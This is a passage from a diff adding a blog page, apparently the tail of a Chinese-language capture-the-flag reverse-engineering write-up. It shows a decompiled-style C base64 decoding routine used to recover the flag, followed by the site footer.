+    int v10; // [esp+Ch] [ebp-4h]
+
+    v10 = 0;
+    for (i = 0; i &lt; lenth_enc; i += 4)
+    {
+        for (j = 0; j &lt; 4; ++j)
+            b[0 + j] = base64_decode_table[*(unsigned __int8*)(enc + j + i)];
+
+        *(_BYTE*)(v10 + plain) = (b[1] &gt;&gt; 4) | (4 * b[0]);
+        ++v10;
+        if (b[2] &gt;= 0x40)
+            break;
+        if (b[3] &gt;= 0x40u)
+        {
+            *(_BYTE*)(v10 + plain) = (b[2] &gt;&gt; 2) | (16 * b[1]);
+            return ++v10;
+        }
+        *(_BYTE*)(v10 + plain) = (b[2] &gt;&gt; 2) | (16 * b[1]);
+        *(_BYTE*)(++v10 + plain) = b[3] | (b[2] &lt;&lt; 6);
+        ++v10;
+    }
+    return v10;
+}
+</code></pre><p>运行后拿到flag</p><img loading="lazy" src="https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260314000135281.png" alt="image-20260314000135281" style="zoom:50%;" data-is-external-image="true"></div></article></main><footer class="site-footer"><div class="container footer-inner"><p>Made with Publii and the Blush Persona theme.</p><p>&copy; QAQ</p></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script><script>hljs.highlightAll();</script><script src="https://lq-a-ql.github.io/assets/js/main.js" defer="defer"></script></body></html>
